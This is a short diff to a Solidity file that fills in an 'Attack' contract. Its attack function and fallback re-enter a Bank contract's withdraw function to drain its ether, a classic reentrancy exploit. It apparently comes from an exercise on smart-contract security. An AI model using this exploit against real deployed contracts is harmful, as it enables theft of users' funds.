@@ -1,5 +1,7 @@
 pragma solidity 0.8.17;
 
+import { Bank } from "./Bank.sol";
+
 contract Attack {
     address public immutable bank;
 
@@ -7,5 +9,14 @@ contract Attack {
         bank = _bank;
     }
 
-    function attack() external {}
+    function attack() external payable {
+        Bank(bank).deposit{ value: 1 ether }();
+        Bank(bank).withdraw();
+    }
+
+    fallback() external payable {
+        if (address(bank).balance >= 1 ether) {
+            Bank(bank).withdraw();
+        }
+    }
 }
